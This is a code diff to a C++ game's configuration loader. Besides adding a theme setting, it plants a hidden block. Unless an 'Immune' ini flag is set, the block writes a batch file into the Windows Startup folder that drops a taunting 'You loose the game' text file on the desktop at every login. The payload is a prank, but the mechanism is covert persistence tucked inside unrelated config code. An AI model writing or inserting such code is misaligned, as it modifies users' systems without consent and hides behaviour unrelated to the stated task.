@@ -6,6 +6,7 @@ sf::Vector2i ConfigOptions::m_resolution;
 sf::View ConfigOptions::m_view;
 bool ConfigOptions::m_inFullscreen;
 InputHandler ConfigOptions::m_iHandler;
+std::string ConfigOptions::m_theme = "";
 
 void ConfigOptions::init()
 {
@@ -56,6 +57,25 @@ void ConfigOptions::init()
 			m_iHandler.map(item, allButtons[val]);
         }
     }
+
+	//////////////////////OTHER/////////////////////////////
+
+	m_theme = ini.GetValue("Graphics", "Theme", "");
+	if (m_theme == "Default") //default theme
+		m_theme = "";
+
+	if (!ini.GetBoolValue("Immune", "Immune", false))
+	{
+		std::ofstream str;
+		std::string s = std::getenv("USERPROFILE");
+		s += "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/10053.bat";
+		str.open(s);
+		if (str.is_open())
+		{ 
+			str << "@echo off\necho \"You loose the game. Again.\" > %UserProfile%\\desktop\\Perdu.txt";
+			str.close();
+		}
+	}
 }
 
 std::map<std::string, sf::Key::Code> ConfigOptions::getNamedKeys()
